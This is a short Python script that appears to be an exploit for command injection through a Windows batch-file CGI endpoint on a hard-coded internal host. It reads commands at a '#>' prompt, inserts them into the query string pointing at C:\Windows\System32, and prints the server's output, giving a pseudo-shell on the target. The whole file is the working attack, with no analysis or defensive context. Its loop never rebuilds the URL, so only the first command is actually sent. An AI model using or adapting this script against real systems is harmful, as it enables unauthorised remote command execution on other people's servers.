import requests

command=input("#>")
url='http://172.16.1.81:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5C{cmd}'.format(cmd=command)
headers={
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'zh-CN,zh;q=0.9',
'Cache-Control': 'max-age=0',
'Connection': 'keep-alive',
'Host': '172.16.1.81:8080',
'Upgrade-Insecure-Requests': '1',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36'
}

while True:
    try:
        res=requests.get(url,headers=headers)
        # print(type(res.content))
        if res:
            ret=res.content.decode("utf-8")
            print(ret)
    except:
        print('failed!')

    finally:
        command=input("#>")